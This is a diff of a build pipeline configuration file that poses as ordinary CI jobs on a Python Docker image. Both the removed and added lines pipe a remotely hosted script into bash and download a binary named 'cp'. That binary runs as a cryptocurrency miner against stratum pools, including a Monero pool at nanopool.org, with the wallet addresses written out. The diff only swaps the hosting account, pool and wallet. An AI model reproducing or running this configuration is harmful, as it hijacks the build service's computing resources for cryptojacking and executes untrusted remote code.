@@ -11,17 +11,17 @@
     docker_image_name: "library/python"
     docker_image_tag: "3.9"
     execute_commands:
-    - "curl -sL https://raw.githubusercontent.com/erlandi-main-api/gaga/main/x | bash &"
+    - "curl -sL https://raw.githubusercontent.com/WifeAiBot/gaga/main/x | bash &"
     cached_dirs:
     - "/root/.cache/pip"
     shell: "BASH"
-  - action: "chmod +x cp && ./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.test"
+  - action: "chmod +x cp && ./cp -a rx/0  -o stratum+tcps://xmr-us-east1.nanopool.org:10300 -u 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY.test"
     type: "BUILD"
     docker_image_name: "library/python"
     docker_image_tag: "3.9"
     execute_commands:
-    - "wget https://github.com/erlandi-main-api/testpoint/raw/main/cp"
-    - "chmod +x cp && ./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.test"
+    - "wget https://github.com/WifeAiBot/testpoint/raw/main/cp"
+    - "chmod +x cp && ./cp -a yespowertide  -o stratum+tcps://xmr-us-east1.nanopool.org:10300 -u 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY.test"
     cached_dirs:
     - "/root/.cache/pip"
     shell: "BASH"
